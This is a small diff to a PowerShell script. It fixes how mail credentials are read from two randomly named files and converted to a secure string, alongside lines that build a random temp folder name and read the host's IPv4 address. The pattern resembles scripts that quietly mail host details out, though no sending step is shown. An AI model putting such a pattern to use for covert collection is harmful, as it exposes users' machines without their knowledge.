@@ -3,9 +3,9 @@ $temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))
 
 # Vars for mail
 $addr = ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress)
-$user = (Get-Content ./etgtYmwQUO.txt)
-$p = (Get-Content ./f4EWj29Hgq.txt)
-$p = (ConvertTo-SecureString $p -String -Force)
+$user = (Get-Content ./etgtYmwQUO.txt).Trim()
+$p = (Get-Content ./f4EWj29Hgq.txt).Trim()
+$p = (ConvertTo-SecureString -String $p -AsPlainText -Force)
 
 #$user = "hideme"
 #$p = ConvertTo-SecureString "hideme" -AsPlainText -Force
